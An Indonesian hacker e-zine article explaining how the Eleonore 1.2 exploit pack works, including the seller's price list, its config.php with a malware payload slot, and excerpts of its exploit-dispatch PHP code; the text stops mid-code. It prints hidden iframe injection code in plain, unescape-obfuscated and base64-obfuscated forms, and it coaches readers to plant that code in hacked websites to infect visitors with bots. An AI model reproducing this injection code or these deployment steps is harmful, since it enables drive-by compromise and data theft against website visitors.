@@ -1,0 +1,831 @@
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : Eleonore and The Crimeware Myth
+Writer    : G.S
+Contact   : staff@kecoak-elektronik.net
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Intro
+
+Dunia kejahatan internet semakin berkembang seiring dengan berkembangnya
+teknolgi informasi. Dunia kejahatan internet ini berkembang karena
+besarnya kesempatan dan permintaan kejahatan tersebut dengan berbagai
+macam motif, dan yang paling kuat menurut hemat saya pribadi adalah
+latar belakang ekonomi / bisnis. Kita seringkali mendengar tentang
+kejahatan pencurian data dari komputer pribadi melalui internet,
+pencurian data internet banking, hingga pencurian data yang melibatkan
+konspirasi politik. Banyak orang yang menganggap hal tersebut sebagai
+mitos belaka, atau hanya menganggap hal tersebut adalah fiksi yang hanya
+bisa ditemukan didalam film-film. Komunitas underground bertopi hitam
+(blackhat community) bukan merupakan mitos, kelompok-kelompok ini tetap
+aktif melakukan berbagai aksi dan umumnya karena mereka mendapatkan
+keuntungan finansial dari aksi-aksi tersebut. Dari beragam kejahatan
+internet tersebut salah satunya akan dibahas melalui artikel ini.
+
+Dalam dunia underground indonesia sendiri terdapat banyak aksi kejahatan
+internet dan kita tidak perlu menyebutkan satu per satu, namun diantara
+para pelaku aksi kejahatan tersebut tidak banyak yang mengetahui bahwa
+tindakan mereka sebetulnya dapat dibawa ke tingkat yang lebih tinggi
+jika saja mereka mengetahui bagaimana caranya dan apa manfaatnya. 
+
+Saya tidak bertanggungjawab atas dampak dari artikel ini karena
+tujuannya adalah membuat masyarakat indonesia lebih waspada lagi atas
+aktivitas kejahatan internet model ini, dan saya juga tidak peduli jika
+kalian para whitehat / security consultant mendapatkan ide untuk membuat
+customer (banking?) lebih ketakutan lagi setelah membaca dan menggali
+lebih dalam mengenai hal yang disampaikan disini untuk mendapatkan
+keuntungan yang lebih besar.
+
+
+--[3]-- Malware
+
+Saya seringkali tersenyum jika melihat pembahasan pada forum-forum IT
+security (underground?blah!) di Indonesia. Mereka umumnya menyamakan
+makna malware dengan virus/worm, dan pembahasannya pun hanya sebatas
+virus/worm. Bukan berarti semua forum anak-anak itu tidak mengerti, ada
+juga yang memasukan contoh lain, namun umumnya seperti itu :).
+
+Untuk makna malware sendiri bisa kalian lihat langsung pada
+wikipedia[1], oh iya kids...saya tidak peduli apakah kalian bisa english
+atau tidak, just read it! Jadi yang termasuk kategori malware (malicious
+software) adalah virus, worm, trojan horse, backdoor, rootkits, spyware,
+botnet, dsb. Jika kalian ingin membahas mengenai malware, setelah
+membaca artikel ini, silahkan cari lebih banyak software-software
+tersebut dibandingkan pembahasan membosankan seperti 'kk, kompi saya
+kena virus, bisa tolongin gak?' *jerk*
+
+
+--[4]-- Crimeware
+
+Definisi resminya bisa dibaca pada wikipedia[2]. Intinya adalah,
+crimeware berisi beragam software yang digunakan untuk aksi kejahatan
+internet. Nah, pada bagian ini kita mulai masuk kedalam inti artikel ;).
+
+Crimeware ada beragam jenis, namun jika kita kelompokan maka bisa
+dibayangkan beragam tools yang dibutuhkan untuk menjalankan scenario
+kejahatan internet. 
+
+Crimeware beredar melalui komunitas underground, dan yang paling populer
+sejak dulu adalah komunitas blackat rusia. Rusia memiliki banyak
+programmer-programmer luar biasa, dan mereka saling berkumpul dalam
+forum-forum yang sifatnya private untuk saling bertukar informasi
+mengenai tools-tools. Kalaupun tidak private, tetap sulit bagi
+masyarakat luar karena orang-orang rusia menggunakan huruf-huruf
+tersendiri serta bahasa mereka sendiri, sehingga komunitas ini umumnya
+sulit ditembus oleh orang-orang yang tidak bisa berbahasa rusia.
+Komunitas blackhat rusia bisa dibilang no.1 di dunia saat ini, dan
+beberapa tahun belakangan mulai di ikuti oleh komunitas blackhat china.
+
+Komunitas blackhat ini umumnya menjual crimeware tersebut dengan kisaran
+harga antara 500-1000 usd. Harga tergantung kemampuan crimeware. Semakin
+private crimeware tersebut, semakin sulit di deteksi / analisis, dan
+semakin banyak korban yang berjatuhan akibat dari crimeware tersebut
+maka akan semakin mahal harganya.
+
+Crimeware berkembang seiring dengan perkembangan teknologi, yang awalnya
+hanya berupa virus untuk mencuri data dan kemudian berkembang menjadi
+worm, botnet, hingga yang populer saat ini adalah dengan memanfaatkan
+'client side' hacking.
+
+
+--[5]-- Client Side Hacking
+
+Trend hacking jaman dahulu adalah melakukan serangan terhadap
+server-server besar, tujuannya untuk mendapatkan akses administrator /
+root. Semakin kesini trend tersebut berpindah dengan menjadikan pengguna
+komputer PC (Personal Computer) sebagai target serangan. Jika sebelumnya
+yang menjadi target serangan adalah web server, atau mail server, maka
+saat ini yang menjadi target serangan adalah web browser ataupun mail
+client.
+
+Komunitas profesional sering menyebutnya sebagai client-side hacking.
+Jika kalian bermain-main ke situs seperti milw0rm, packetstormsecurity,
+ataupun yang baru-baru ini muncul seperti exploit-db maka akan menjumpai
+banyak eksploit untuk aplikasi-aplikasi seperti internet explorer,
+mozilla firefox, outlook express, adobe acrobat reader, dsb. Ini
+merupakan hasil dari pergeseran trend hacking. Para hacker (baik
+underground maupun professional) mulai melakukan fuzzing terhadap
+aplikasi-aplikasi client tersebut untuk menemukan bug serta
+meng-eksploitasinya.
+
+Beragam hasil riset tersebutlah yang kemudian memunculkan
+istilah-istilah seperti "Heap Spray", "Heap Fengshui", hingga yang
+terbaru yaitu "JIT spray". 
+
+Singkat kata, dengan trend hacking saat ini, ketika seseorang membuka
+suatu kode yang didalamnya terdapat trigger untuk membuat browser
+seperti internet explorer crash (mis: dengan javascript dan HTML), maka
+hal tersebut dapat dimanfaatkan untuk menjadikan internet explorer
+sebagai pintu masuk menguasai komputer itu.
+
+Ini adalah berita bagus bagi para kriminal khususnya komunitas blackhat.
+Mereka cukup mendapatkan akses untuk menguasai suatu website (dengan
+RFI, SQL injection, interusi melalui webserver, dsb), menyisipkan ke
+salah satu file-file html / php dengan script yang dapat
+meng-eksploitasi browser, dan tinggal menunggu target mengunjungi
+website tersebut. Apabila target menggunakan browser yang vulnerable,
+maka booom...komputer target dapat dikuasai.
+
+
+--[6]-- Exploit Pack
+
+Crimeware umumnya dibuat untuk memudahkan proses pengambilalihan
+komputer korban, semakin mudah digunakan dan semakin flexible maka akan
+semakin baik (dan mahal :)). Ada beragam contoh crimeware, namun yang
+akan kita bahas saat ini adalah Exploit Pack.
+
+Bagi para anggota underground jelas exploit pack ini bukan barang baru,
+beragam contoh seperti: MPack, Unique sploits pack, neon exploit system,
+elfieste, zeus, YES exploit system, eleonore, termasuk dalam kategori
+Exploit Pack. Dan hampir semuanya dibuat oleh komunitas blackhat rusia.
+
+Exploit pack merupakan suatu crimeware yang didalamnya terdapat beragam
+feature seperti: 
+
+1. Modul client-side exploit, contohnya: MDAC exploit, MS009-02 exploit,
+DirectX DirectShow exploit, PDF Util.Printf exploit, dsb.
+2. Modul untuk administrasi dimana kita bisa melihat: statistik traffic
+dari target yang mengakses crimeware tersebut, jumlah korban yang
+berhasil dikuasai, modul instalasi, modul penghapusan, dsb.
+3. Modul untuk generate attack vector, umumnya berupa modul untuk
+generate <iframe> dari alamat server penyimpan eksploit pack tersebut.
+
+Setiap exploit pack memiliki feature yang berbeda, namun ketiga hal
+diatas merupakan fitur umum yang biasanya dimiliki oleh suatu exploit
+pack.
+
+Kita akan membahas mengenai salah satu Exploit Pack yang cukup populer,
+yaitu eleonore.
+
+
+--[7]-- Eleonore
+
+Berikut ini bentuk iklan untuk eleonore dari salah satu forum jual beli
+crimeware yang ditulis oleh Exmanoize (developer eleonore),
+
+/////////////////////////////////////////////////////////////
+Hello!
+I present new actual russian exploits pack "Eleonore Exp v1.2"
+
+
+Exploits on pack:
+> MDAC
+> MS009-02
+> Telnet - Opera
+> Font tags - FireFox
+> PDF collab.getIcon
+> PDF Util.Printf
+> PDF collab.collectEmailInfo
+> DirectX DirectShow
+> Spreadsheet
+
+installs on traffic:
+> on usa: 5-15%
+> on mix: 10-25%
+[size=1]* Piercing indicates approximate, may vary and depends directly
+on the type and quality of traffic. size]
+
+
+Price:
+> Eleonore Exp Pack 1.2 = 700$
+> Cleans cryptor on AV = 50$
+> Rebild on another domain = 50$
+* PACK is binding on domain.
+> Eleonore Exp Pack 1.2 with not binding domain(free on domain) = 1500$
+
+
+
+–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ!
+–ü—Ä–µ–¥–ª–∞–≥–∞–µ–º —Å–≤—è–∑–∫—É —Å–ø–ª–æ–π—Ç–æ–≤ "Eleonore Exp v1.2"
+
+–û–±–Ω–æ–≤–ª–µ–Ω–∏—è:
+–†–∞–±–æ—Ç–∞ –Ω–∞–¥ —Å–≤—è–∑–∫–æ–π –≤–µ–¥–µ—Ç—Å—è –ø–æ—á—Ç–∏
+–∫–∞–∂–¥—ã–π –¥–µ–Ω—å, —Å–≤—è–∑–∫–∞ —Ç–µ—Å—Ç–∏—Ä—É–µ—Ç—Å—è,
+—É–ª—É—á—à–∞–µ—Ç—Å—è, –æ—Ç—Ç–∞—á–∏–≤–∞–µ—Ç—Å—è, –≤–æ—Ç —É–∂–µ –∏ –≤
+–ø—Ä–æ–¥–∞–∂–µ –≤–µ—Ä—Å–∏—è 1.2.
+> –ó–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ —É–≤–µ–ª–∏—á–∏–ª—Å—è –ø—Ä–æ–±–∏–≤.
+> (–¥–æ–±–∞–≤–ª–µ–Ω –Ω–æ–≤—ã–π
+> —Å–ø–ª–æ–π—Ç,–æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω—ã–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ
+> —Å—Ç–∞—Ä—ã–µ —ç–∫—Å–ø—ã)
+> –§–∞–π–ª —Ç–µ–ø–µ—Ä—å –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑
+> –∞–¥–º–∏–Ω–∫—É. (–∑–∞–≥—Ä—É–∂–∞—Ç—å —Ñ–∞–π–ª –º–æ–∂–Ω–æ –∫–∞–∫ —Å
+> –≤–∞—à–µ–≥–æ –∫–æ–º–ø–∞, —Ç–∞–∫ –∏ —Å —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞)
+
+–í —Å–æ—Å—Ç–∞–≤ —Å–≤—è–∑–∫–∏ –≤—Ö–æ–¥—è—Ç —Å–ª–µ–¥—É—é—â–∏–µ
+—ç–∫—Å–ø–ª–æ–π—Ç—ã:
+> MDAC
+> MS009-02
+> Telnet - Opera
+> Font tags - FireFox
+> PDF collab.getIcon
+> PDF Util.Printf
+> PDF collab.collectEmailInfo
+> DirectX DirectShow
+> Spreadsheet
+
+–°—Ä–µ–¥–Ω–∏–π –ø—Ä–æ–±–∏–≤ –Ω–∞ —Å–≤—è–∑–∫–µ:
+> –Ω–∞ —É—Å–∞ —Ç—Ä–∞—Ñ—Ñ–µ: 8-17%
+> –Ω–∞ —Ä—É-—Å–Ω–≥ —Ç—Ä–∞—Ñ—Ñ–µ: 10-25%
+* –ü—Ä–æ–±–∏–≤ —É–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è –ø—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω—ã–π,
+* –º–æ–∂–µ—Ç –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –∏ –∑–∞–≤–∏—Å–∏—Ç –Ω–∞–ø—Ä—è–º—É—é
+* –æ—Ç –≤–∏–¥–∞ –∏ –∫–∞—á–µ—Å—Ç–≤–∞ —Ç—Ä–∞—Ñ—Ñ–∏–∫–∞.
+
+
+–¶–µ–Ω–∞ –ø–æ—Å–ª–µ–¥–Ω–µ–π –≤–µ—Ä—Å–∏–∏ 1.2:
+> –°—Ç–æ–∏–º–æ—Å—Ç—å —Å–∞–º–æ–π —Å–≤—è–∑–∫–∏ = 700$
+> –ß–∏—Å—Ç–∫–∏ –æ—Ç –ê–í = 50$
+> —Ä–µ–±–∏–ª–¥ –Ω–∞ –¥—Ä—É–≥–æ–π –¥–æ–º–µ–Ω = 50$
+* –°–≤—è–∑–∫–∞ —Å –ø—Ä–∏–≤—è–∑–∫–æ–π –∫ –¥–æ–º–µ–Ω—É.
+* –¥–ª—è –ø–µ—Ä–≤—ã—Ö 3—Ö –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–π, —Ü–µ–Ω–∞ —Å–≤—è–∑–∫–∏
+* 600$
+
+
+–¶–µ–Ω—ã –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –≤–µ—Ä—Å–∏–π:
+(–±—é–¥–∂–µ—Ç–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç)
+> –¶–µ–Ω–∞ –≤–µ—Ä—Å–∏–∏ 1.1 = 500$
+* –æ—Ç—Å—É—Ç—Å–≤—É–µ—Ç: Spreasheet(–≤–º–µ—Å—Ç–æ –Ω–µ–≥–æ snapshot).
+> –¶–µ–Ω–∞ –≤–µ—Ä—Å–∏–∏ 1.0 = 300$
+* –æ—Ç—Å—É—Ç—Å–≤—É—é—Ç: Spreasheet(–≤–º–µ—Å—Ç–æ –Ω–µ–≥–æ
+* snapshot),DirectX DS,Font tags.
+* –ü—Ä–∏ –ø–æ–∫—É–ø–∫–µ —Å—Ç–∞—Ä—ã—Ö –≤–µ—Ä—Å–∏–π,–≤—ã
+* –≤–ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–µ –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç —Å–º–æ–∂–µ—Ç–µ
+* –∞–ø–≥—Ä–µ–π–¥–∏—Ç—å —Å–≤—è–∑–∫—É –¥–æ –Ω–æ–≤–æ–π –≤–µ—Ä—Å–∏–∏.
+* –ü—Ä–æ–±–∏–≤ –Ω–∞ —Å—Ç–∞—Ä—ã—Ö –≤–µ—Ä—Å–∏—è—Ö –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ
+* –Ω–∏–∂–µ.
+* –°—Ç–æ–∏–º–æ—Å—Ç—å —á–∏—Å—Ç–∫–∏ —Ç–∞–∫–∞—è –∂–µ.
+/////////////////////////////////////////////////////////////
+
+Bisa kita lihat bahwa iklan tersebut diberikan dalam dua jenis bahasa,
+yang pertama dalam bahasa internasional (english) dan yang kedua adalah
+bahasa rusia. 
+
+Iklan penjualan tersebut dengan jelas menunjukan harga dari exploit pack
+eleonore, dengan tambahan cleans cryptor on AV untuk 50 usd. Paket 700
+usd tersebut diberikan dalam bentuk binding domain, yang berarti sudah
+diinstall pada suatu domain dan sebagai pembeli akan diberikan akses ke
+control panel eleonore pada domain tersebut. Re-instalasi pada domain
+lain hanya membutuhkan 50 usd, sedangkan untuk eleonore exploit pack 1.2
+yang bebas di install pada domain manapun dijual lebih mahal, yaitu 1500
+usd.
+
+Iklan dalam bahasa rusia sedikit berbeda, yaitu dengan tambahan
+informasi berupa harga exploit pack versi sebelumnya (1.0 & 1.1) senilai
+500 usd (1.1) dan 300 usd (1.0), versi lama ini minus spreadsheet
+exploit yang notabene merupakan exploit baru pada versi pack 1.2 diatas.
+Dan terdapat informasi tambahan bagi 3 pembeli pertama mendapatkan
+discount seharga 600 usd (untuk pack yang telah di install pada domain
+tertentu).
+
+Komunitas blackhat rusia menyimpan banyak sekali misteri dan hal-hal
+menarik, namun seringkali yang menjadi masalah adalah bahasa serta
+tulisan yang mereka gunakan. Untuk itu biasanya kita bisa melakukan
+beberapa strategi, diantaranya:
+
+*) google translate (oh yeah...bahkan anak SD pun bisa melakukannya).
+*) mencari partner orang yang bisa berbahasa rusia, jauh lebih bagus
+jika mereka juga anggota komunitas blackhat rusia. atau bisa juga rekan
+ini berasal dari negara-negara ex-sovyet (contoh: eropa timur) karena
+umumnya mereka menggunakan cyrillic dan juga bisa berbahasa rusia.
+*) belajar bahasa rusia dan huruf cyrilic ;).
+
+
+--[8]-- Eleonore 1.2
+
+Sebagai bahan diskusi kali ini kita akan coba meng-eksplorasi exploit
+pack eleonore versi 1.2, exploit pack ini sudah leak kepada publik dan
+notabene merupakan tipe lama, dengan sedikit google foo kalian bisa
+menemukan pack tersebut dengan mudah. Versi terbaru yang saya tahu untuk
+eleonore adalah 1.3.2 dan sudah memiliki feature domain lock, dan setau
+saya dijual terbatas pada forum-forum private ataupun komunitas blackhat
+rusia.
+
+Tujuan utama dari artikel adalah menunjukan bagaimana exploit pack yang
+merupakan salah satu crimeware bekerja, bukan untuk menyebarluaskan
+crimeware tersebut (ph34r 2 173 & 12PM content.lol.).
+
+Eleonore exploit pack berisi file-file sbb:
+
+GeoIP.dat		dx_ds.gif		geoip.php       pdf.php
+_install.php	error_log		getexe.php		stat.php
+config.php		exp.php			i/              test.php
+crypt.php		functions.php	index.php
+
+"i" merupakan suatu folder yang isinya untuk mempercantik tampilan
+halaman control panel, untuk itu tidak akan kita bahas.
+
+Exploit pack diatas umumnya diletakan pada suatu domain dengan hosting
+yang telah support PHP dan MySQL. Domain ini bisa diregister sendiri,
+ataupun hasil jarahan dari eksploitasi menggunakan sql injection dan
+beragam web bug lain (hello defacer, keep reading dude). Cukup
+menambahkan satu buah database dan grant satu user yang dapat mengakses
+database tersebut, kemudian lakukan konfigurasi pada file "config.php"
+eleonore yang isinya sbb:
+
+
+<?
+
+//=== Control Panel===//
+$admin		= 'eleonore';   // Username
+$pwd		= 'TestEleonore';	// Password
+
+//======// MySQL BATABASE //======
+$db_host	= 'localhost';	// DB Host
+$db_name	= 'test_eleonore';	// DB Name
+$db_user	= 'test_eleonor';	// DB User
+$db_pass	= '12233';			// DB Pass
+
+// ===== malware & 404
+$file_load  = "load.exe";	 // malware
+$nonuniq='404.php';	    // 404 page
+
+// Don't touch
+$url = "http://".$_SERVER["HTTP_HOST"].str_replace ("\\", "/", dirname
+($_SERVER["PHP_SELF"]))."/getexe.php";
+$pdf ="http://".$_SERVER["HTTP_HOST"].str_replace ("\\", "/", dirname
+($_SERVER["PHP_SELF"]))."/pdf.php";		
+
+?>
+ 
+Cukup jelas bukan?bagian control panel merupakan konfigurasi untuk
+username dan password, bagian mysql database untuk akses database. Yang
+mungkin sedikit membingungkan adalah bagian "malware & 404" serta bagian
+akhir yang diberi comment "Don't touch". Mohon diperhatikan bahwa
+config.php diatas sudah saya edit, comment asli dari author nya berbeda
+dan menggunakan non-english character.
+
+Pada variabel $file_load kita akan ganti dengan nama malware yang akan
+dijalankan pada komputer korban. Eleonore merupakan exploit pack, dalam
+arti akan membantu proses eksploitasi namun tidak memberikan malware
+yang dapat kita gunakan. Malware tersebut yang pada bagian sebelumnya
+telah kita ketahui dapat berupa trojan, worm, ataupun spybot umumnya
+bisa didapatkan secara terpisah. Ambil contoh yang paling populer saat
+ini adalah zeus bot, dan yang terbaru adalah spyeye[3]. Kita cukup
+generate/build bot yang diinginkan, jika perlu bind dengan suatu
+aplikasi / file dan masukan kedalam direktori eleonore diatas. Kita bisa
+gunakan nama lain selain "load.exe", namun nama dari bot tersebut harus
+disesuaikan dalam file konfigurasi config.php.
+
+Eleonore memiliki feature minimalis untuk melakukan pengecekan apakah
+komputer korban pernah mengakses eleonore melalui informasi alamat ip
+nya, bukan suatu metode yang baik terutama jika kita mengetahui bahwa
+ratusan bahkan ribuan komputer client yang berpotensi sebagai target
+berada dibelakang NAT, namun memodifikasi source code nya juga bukan
+sesuatu hal yang rumit ;). Disinilah letak salah satu fungsi variable
+$nonunique diatas, yaitu mendefinisikan suatu file 404.php ketika target
+dengan alamat IP yang sama berusaha mengakses eleonore. Kita akan lihat
+nanti bahwa pada implementasinya tanpa perlu membuat file 404.php pun
+feature diatas ttp dapat bekerja.
+
+Bagian akhir berhubungan dengan proses eksploitasi. Eleonore akan
+mendeteksi browser yang digunakan target dan menentukan jenis eksploit
+apa saja yang dapat digunakan. Pada bagian ini didefinisikan apa yang
+disebut attack-vector, yaitu browser exploit standar atau pdf exploit.
+
+Jika kita membeli pack tersebut dengan domain binding (lebih murah),
+maka kita akan mendapatkan informasi user/password, url control panel,
+dan mekanisme untuk meng-upload malware yang diinginkan. Versi diatas
+1.2 memiliki feature untuk upload malware secara otomatis melalui
+control panel, namun untuk eleonore 1.2 belum memiliki feature tersebut
+dan akan diasumsikan menggunakan pack yang tidak terbatas pada domain
+binding (full source code).
+
+Setelah mendefinisikan isi config.php, maka tiba saatnya instalasi.
+Dengan asumsi eleonore terinstall pada domain
+http://www.server.com/el12/ maka kita dapat mengakses halaman control
+panel dengan url: http://www.server.com/el12/stat.php. Masukan
+username&password maka akan muncul halaman control panel yang terdiri
+dari:
+
+1. IFRAME
+2. MAIN
+3. REFERER
+4. COUNTRY
+5. CLEAR
+
+Menu Iframe akan memberikan informasi:
+
+1. URL traffic yang akan diakses oleh target: 
+http://www.server.com/el12/. 
+
+2. Iframe code untuk URL traffic:  
+<iframe src="http://www.server.com/el12/index.php" width="0" height="0"
+frameborder="0"></iframe>
+
+3. Encode iframe unescape:
+<script>var c
+='%25%33%43%69%66%72%61%6d%65%25%32%30%73%72%63%25%33%44%25%32%32%68%74%74%70%25%33%41%25%32%46%25%32%46%77%77%77%2e%73%65%72%76%65%72%2e%63%6f%6d%25%32%46%65%6c%31%32%25%32%46%69%6e%64%65%78%2e%70%68%70%25%32%32%25%32%30%77%69%64%74%68%25%33%44%25%32%32%30%25%32%32%25%32%30%68%65%69%67%68%74%25%33%44%25%32%32%30%25%32%32%25%32%30%66%72%61%6d%65%62%6f%72%64%65%72%25%33%44%25%32%32%30%25%32%32%25%33%45%25%33%43%25%32%46%69%66%72%61%6d%65%25%33%45';var
+d=unescape(unescape(c));document.write(unescape(d));</script>
+
+4. Encode iframe 64:
+<script>var
+k0e0y0S="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var
+SdgZ="PGlmcmFtZSBzcmM9Imh0dHA6Ly93d3cuc2VydmVyLmNvbS9lbDEyL2luZGV4LnBocCIgd2lkdGg9IjAiIGhlaWdodD0iMCIgZnJhbWVib3JkZXI9IjAiPjwvaWZyYW1lPg==";var
+iaN5="";var K1sN,AQ6C,yDgH,flsh,cWTJ,FXjz,Qym6="";var i=0;var
+base64test=/[^A-Za-z0-9\+\/\=]/g;SdgZ=SdgZ.replace(/[^A-Za-z0-9\+\/\=]/g,"");do{flsh=k0e0y0S.indexOf(SdgZ.charAt(i++));cWTJ=k0e0y0S.indexOf(SdgZ.charAt(i++));FXjz=k0e0y0S.indexOf(SdgZ.charAt(i++));Qym6=k0e0y0S.indexOf(SdgZ.charAt(i++));K1sN=(flsh<<2)|(cWTJ>>4);AQ6C=((cWTJ&15)<<4)|(FXjz>>2);yDgH=((FXjz&3)<<6)|Qym6;iaN5=iaN5+String.fromCharCode(K1sN);if(FXjz!=64){iaN5=iaN5+String.fromCharCode(AQ6C);}if(Qym6!=64){iaN5=iaN5+String.fromCharCode(yDgH);}K1sN=AQ6C=yDgH="";flsh=cWTJ=FXjz=Qym6="";}while(i<SdgZ.length);document.write(unescape(iaN5));
+</script>
+
+Informasi data diatas merupakan jebakan yang akan digunakan untuk
+meng-eksploitasi korban. Proses eksploitasi akan berjalan ketika korban
+melakukan browsing ke eleonore yang beralamat di URL:
+http://www.server.com/el12/index.php, kita dapat memeanfaatkan tag
+<iframe> untuk hal tersebut. Bentuk tag <iframe> yang sesuai telah
+diberikan baik secara mentah (2), di encode dengan unescape (3), maupun
+di encode dengan 64bit encoding (4).
+
+Dimasukan kemana? tentu saja kedalam situs-situs yang telah berhasil
+dikuasai. Misal: kita telah menemukan suatu hole pada website
+www.situskomersial.com dan memiliki akses untuk memodifikasi file-file
+didalamnya, maka daripada melakukan deface akan jauh lebih berguna (hey
+hey...tentu saja dalam konteks 'pengetahuan' kriminal internet, not for
+abusing! ;-) ) dengan menyisipkan tag iframe dari eleonor diatas, misal
+pada file index.php situs www.situskomersial.com tersebut.
+
+Akan jauh lebih baik jika tag iframe yang dimasukan menggunakan tag
+telah di-encode karena lebih mengecoh target korban. Jadi begitu korban
+melakukan browsing ke situs www.situskomersial.com, browser yang
+digunakan akan mendeteksi keberadaan <iframe> dan mencoba untuk
+mengakses http://www.server.com/el12/index.php tanpa sepengetahuan
+pengguna, apa yang dia lihat adalah tampilan website
+www.situskomersial.com. Pada bagian inilah browser akan di-cek oleh
+eleonore dan dicoba untuk eksploitasi menggunakan ragam eksploit yang
+tersedia.
+
+Jika korban menggunakan browser yang vulnerable terhadap persediaan
+eksploit eleonore, maka secara otomatis komputer korban akan mendownload
+malware yang sebelumnya telah disediakn serta mengeksekusinya (hal ini
+didefinisikan oleh shellcode 'downlod and exec'). Sisanya tinggal
+bagaimana malware tersebut bekerja, misalnya malware tersebut merupakan
+suatu keylogger yang akan menangkap aktivitas keyboard korban dan
+mengirimkan informasinya setiap 1 jam sekali melalui FTP, atau suatu
+malware canggih yang memiliki kemampuan untuk meng-intercept komunikasi
+menggunakan library hooking yang digunakan oleh internet explorer
+(wininet.dll), atau malware yang di design untuk mencari dan membaca
+data dengan spesifikasi tertentu seperti dokumen rahasia pemerintah,
+dokumen bisnis, dsb.
+
+Kita dapat melihat statistics dari keberhasilan proses eksploitasi
+eleonore dari bagian "Main". Akan terlihat persentase berapa banyak
+target yang terjebak dan berapa banyak target yang berhasil di
+eksploitasi. Semakin tinggi jumlah target yang dapat di eksploitasi
+(traffic load) maka akan semakin mahal harga suatu eksploit pack.
+Traffic load eleonore diklaim berkisar antara 5%-10%, yang berarti dari
+100 korban yang berhasil terjebak, terdapat 5-10 korban yang berhasil
+di-eksploitasi dan mengeksekusi malware tersebut. Tidak begitu tinggi
+memang.
+
+Begitulah gambaran umum dari penggunaan eleonore, crimeware berjenis
+exploit pack.
+
+
+--[8]-- Eksplorasi Eleonore 1.2
+
+Skill analisis saya tidak begitu bagus, namun berhubung TokET biasanya
+berisi poc dan analisis yang panjaaaan :p, saya akan menyertakan sedikit
+hasil analisis dari eleonore versi 1.2.
+
+/////////////////////////////////////////////////////////////
+$ip = $_SERVER['REMOTE_ADDR'];
+mysql_connect($db_host, $db_user, $db_pass);
+mysql_select_db($db_name);
+$q = mysql_query("select ip from statistic where ip='$ip'");
+$n = mysql_num_rows($q);
+@mysql_free_result($q);
+
+if (($n != 0) and (!isset($_GET['spl']))) {die(header("Location:
+$nonuniq"));}
+/////////////////////////////////////////////////////////////
+
+Kode diatas terdapat pada index.php, yang intinya akan melakukan
+pengecekan informasi IP dari tabel statistics database, IP yang dicek
+merupakan IP korban ketika membuka halaman eleonore. Jika IP tersebut
+sudah ada dalam database, dan url yang hendak diakses oleh korban tidak
+terdapat variable 'spl' maka akan langsung diarahkan pada lokasi dari
+variable $nonuniq. Ini adalah mekanisme sangat sederhana terutama jika
+tujuannya untuk mencegah eleonore dianalisis oleh orang luar. Namun
+tentu saja dapat di-bypass dengan sedikit trik ;).
+
+/////////////////////////////////////////////////////////////
+$country = detect_country($ip);
+detect_brows();
+detect_os();
+$br = $browser . " " .$vers[2];
+@$purl = $_SERVER['HTTP_REFERER'];
+$ref=parse_url($purl);
+@$ref=$ref['host'];
+if (!isset($_GET['spl']))
+{
+$_GET["spl"] ="1";
+$q = mysql_query("insert into statistic (date, ip, os, br, country,
+refer) values ('".date("Y-m-d H:i:s", time())."', '".$ip."', '".$os."',
+'".$br."', '".$country."','".$ref."')");
+@mysql_free_result($q);
+}
+$case_spl = $_GET["spl"];
+/////////////////////////////////////////////////////////////
+
+Bagian diatas dari index.php, yang akan melakukan pengecekan terhadap
+browser yang digunakan oleh korban, os yang digunakan, referer darimana
+korban berasal, dan dimasukan pada tabel statistics. Fungsi-fungsi
+seperti detect_browse() dan detect_os() disimpan pada file
+functions.php.
+
+/////////////////////////////////////////////////////////////
+//          INTERNET EXPLORER                  //
+if ($browser == "MSIE")
+{
+	
+	if ($vers[2] < "7")
+	{	
+		if (($os == "Windows XP") or ($os == "Windows 2003"))
+		{
+		switch ($case_spl) {
+		case 1:echo _crypt(mdac());
+               check();
+               break;
+		case 2:echo "<html><body>"._crypt(DirectX_DS7())."</body></html>"; 	
+		       check();
+		       break;
+		case 3:echo _crypt(Snapshot());		
+		       check();
+		       break;
+		case 5:echo _crypt(msie_sx());		
+		       check();
+		       break;
+		case 4:echo _crypt(pdf_ie2());		
+		       die;
+		       break;
+		}
+		}
+		else
+		{
+		switch ($case_spl) {
+		case 1:echo _crypt(mdac());
+               check();
+               break;
+		case 2:echo _crypt(Snapshot());		
+		       check();
+		       break;
+		case 4:echo _crypt(msie_sx());		
+		       check();
+		       break;
+		case 3:echo _crypt(pdf_ie2());
+               die;
+               check();
+               break;
+						}
+		}
+	}
+	if ($vers[2] >= "7")
+	{
